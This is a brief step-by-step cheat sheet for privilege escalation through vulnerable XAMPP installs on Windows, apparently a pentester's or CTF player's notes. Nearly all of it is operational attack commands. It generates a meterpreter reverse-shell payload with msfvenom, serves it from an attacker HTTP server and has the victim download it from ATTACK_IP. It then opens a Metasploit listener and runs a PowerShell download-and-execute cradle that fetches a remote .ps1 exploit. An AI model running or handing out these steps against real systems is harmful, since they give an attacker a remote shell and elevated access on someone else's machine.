# XAMPP Privilege Escalation

### 1) Check XAMPP Version

    type C:\xampp\properties.ini

If XAMPP version is XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4, then proceed with the follwoing steps:

### 2) Searchsploit

    searchsploit -m 50337

### 3) Craft the payload

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f exe > msf.exe

### 4) Host the .ps1 file and your .exe payload on your HTTP server

    python3 -m http.server 80

### 5) Download payload 

Victim

    mkdir C:\temp
    
    wget http://ATTACK_IP/msf.exe -O C:\temp\msf.exe

### 6) Open a listener on Metasploit

    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost tun0
    set lport PORT
    run

### 7) Run the .ps1 payload and wait for your shell

    iex(new-object net.webclient).downloadstring('http://ATTACK_IP/50337.ps1')
